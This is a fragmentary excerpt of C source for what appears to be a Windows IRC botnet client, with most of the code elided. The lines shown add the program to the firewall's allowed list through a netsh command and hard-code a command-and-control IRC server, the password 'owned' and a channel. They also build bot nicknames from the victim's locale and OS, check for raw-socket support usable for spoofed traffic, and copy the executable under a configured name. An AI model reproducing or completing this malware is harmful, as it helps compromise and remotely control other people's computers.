...
// chaot...
	...
	char cmd[512];
	sprintf(cmd, "Netsh firewall add allowedprogram %s%s %s ENABLE ALL", "%windir%",EXENAME, FWNAME);
...
LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    ...
    switch (message)
    {
		...
		case WM_CREATE:
			...
			en = FALSE;
			strcpy(server,"ircserver.irc.com"); //main dns for bots to connect to
			strcpy(pass,"owned");
			//-STOP EDITING-
			strcpy(serv, server);
			strcpy(chan, "#others");
...
// chaot...
					char szCountry[16];
					char szFormat[16];
					if(GetLocaleInfo(LOCALE_USER_DEFAULT,  LOCALE_SENGCOUNTRY, (LPTSTR)szCountry, sizeof(szCountry) - 1))
					{
						for (i = 0; i <= 3; i++)
						{
...
// chaot...
            	    ...
            	    sprintf(nick,"%s%s%s", szFormat, os, nickx);
		...
		case WM_TIMER:
			if (en == FALSE)
			{
				...
				if (setsockopt(test, IPPROTO_IP, IP_HDRINCL, (char *)&opt, sizeof(opt)) != SOCKET_ERROR)
				{
					...
					strcat(target, EXENAME);  // EXE NAME CONFIG
...
// chaot...
			...
			for (int i = 0; i < 10; i++)
			{
				nOxRand = ((double) rand() / (double)RAND_MAX) * RANGE_MAX + RANGE_MIN;
			}
			Sleep(nOxRand);
